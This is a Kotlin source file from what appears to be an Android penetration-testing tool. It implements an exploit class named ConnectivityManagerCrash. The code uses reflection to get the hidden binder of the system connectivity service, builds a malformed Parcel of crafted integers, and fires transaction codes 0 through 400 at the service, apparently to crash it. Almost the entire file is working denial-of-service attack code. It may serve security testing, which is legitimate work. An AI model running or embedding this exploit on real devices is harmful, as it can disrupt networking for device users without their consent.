package org.chickenhook.parcelexploittester.penetration

import android.content.Context
import android.net.ConnectivityManager
import android.os.IBinder
import android.os.Parcel
import android.os.SystemClock
import android.util.Log

class ConnectivityManagerCrash : IExploit {

    fun getBinder(context: Context?) : IBinder {
        val connectivityService = context?.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val serviceField = connectivityService::class.java.getDeclaredField("mService")
        serviceField.isAccessible = true
        val proxy = serviceField.get(connectivityService)

        val mRemoteField = proxy::class.java.getDeclaredField("mRemote")
        mRemoteField.isAccessible = true
        val mRemote = mRemoteField.get(proxy) as IBinder
        return mRemote
    }

    // https://cs.android.com/android/platform/superproject/+/master:packages/modules/Connectivity/framework/src/android/net/IConnectivityManager.aidl;l=134?q=IConnectivityManager
    override fun launch(context: Context?): Boolean {

        val mRemote = getBinder(context)

        val data = Parcel.obtain();
        data.writeInterfaceToken(mRemote.interfaceDescriptor!!)
        val l1 = intArrayOf(
            0xfffffff, // INTENDED 0x73622a85
            0x00000113,
            0xff00000,
            0xff00000,
            0xff00000,
            0xff00000,
            0xff00000,
            -1,
            -1
        )
        l1.forEach {
            data.writeInt(it)
        }

        val reply = Parcel.obtain()
        for (i in 0..400) {
            Log.d(
                this::class.java.simpleName, "launch <" + i + ">" +
                        ""
            )
            mRemote.transact(i, data, reply, 17)
            SystemClock.sleep(100)
        }
        return true
    }


}